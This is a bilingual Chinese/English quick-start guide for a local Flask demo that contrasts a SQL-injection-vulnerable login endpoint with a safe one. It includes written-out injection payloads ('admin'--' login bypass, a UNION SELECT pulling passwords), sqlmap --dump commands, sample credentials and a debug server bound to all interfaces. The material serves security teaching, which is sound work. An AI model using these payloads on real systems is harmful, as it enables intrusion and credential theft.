# 🚀 快速开始指南 | Quick Start Guide

## 一键启动 | One-Click Launch

### Windows 用户 | Windows Users

```cmd
# 方法1：使用启动脚本
python start_demo.py

# 方法2：直接启动
python flask_sql_injection_demo.py
```

### Linux/macOS 用户 | Linux/macOS Users

```bash
# 安装依赖
pip install -r requirements.txt

# 启动演示系统
python flask_sql_injection_demo.py
```

## 📍 访问地址 | Access URLs

启动成功后，请访问以下地址：

**主页面**: http://127.0.0.1:5000/

## 🧪 快速测试 | Quick Testing

### 1. 脆弱端点测试 | Vulnerable Endpoint Testing

```bash
# 正常登录
curl "http://127.0.0.1:5000/login_vuln?username=admin&password=admin123"

# SQL注入攻击
curl "http://127.0.0.1:5000/login_vuln?username=admin'--&password=any"
```

### 2. 安全端点测试 | Safe Endpoint Testing

```bash
# 正常登录
curl "http://127.0.0.1:5000/login_safe?username=admin&password=admin123"

# SQL注入防护测试
curl "http://127.0.0.1:5000/login_safe?username=admin'--&password=any"
```

### 3. 自动化测试 | Automated Testing

```bash
# 运行完整功能测试
python test_demo.py
```

## 🛠️ sqlmap 测试 | sqlmap Testing

### 安装 sqlmap

```bash
# 使用 pip 安装
pip install sqlmap

# 或者从 GitHub 下载
git clone https://github.com/sqlmapproject/sqlmap.git
```

### 基础扫描

```bash
# 扫描脆弱端点
sqlmap -u "http://127.0.0.1:5000/login_vuln?username=test&password=test" --batch

# 提取数据
sqlmap -u "http://127.0.0.1:5000/login_vuln?username=test&password=test" --batch --dump
```

## 📋 测试账户 | Test Accounts

| 用户名 | 密码 | 角色 |
|--------|------|------|
| admin | admin123 | administrator |
| alice | alice_password | user |
| bob | bob123 | user |
| test_user | test123 | user |

## 🎯 演示场景 | Demo Scenarios

### 场景1：基础SQL注入演示
1. 访问脆弱端点：`/login_vuln?username=admin'--&password=any`
2. 观察返回结果，成功绕过密码验证
3. 访问安全端点：`/login_safe?username=admin'--&password=any`
4. 对比安全实现的防护效果

### 场景2：联合查询攻击
1. 测试载荷：`username=' UNION SELECT 1,username,password FROM users--`
2. 观察是否能获取其他用户信息
3. 在安全端点测试相同载荷

### 场景3：自动化渗透测试
1. 使用 sqlmap 扫描脆弱端点
2. 观察工具如何检测和利用SQL注入
3. 测试安全端点，验证防护效果

## ⚠️ 注意事项 | Important Notes

1. **仅用于教学和研究** | For Educational & Research Only
2. **请勿用于恶意攻击** | Do Not Use for Malicious Attacks  
3. **遵守法律法规** | Comply with Laws and Regulations
4. **控制测试环境** | Control Testing Environment

## 🔧 故障排除 | Troubleshooting

### 问题1：Flask 未安装
```bash
pip install flask
```

### 问题2：端口占用
```bash
# 修改 flask_sql_injection_demo.py 中的端口号
app.run(host="0.0.0.0", port=5001, debug=True)
```

### 问题3：数据库初始化失败
```bash
# 删除现有数据库文件
rm demo.db
# 重新启动应用
python flask_sql_injection_demo.py
```

## 📞 获取帮助 | Getting Help

如遇到问题，请：
1. 查看完整的 README.md 文档
2. 运行测试脚本验证环境
3. 检查应用日志文件 app.log

---

**开始你的SQL注入安全学习之旅！ | Start your SQL injection security learning journey!**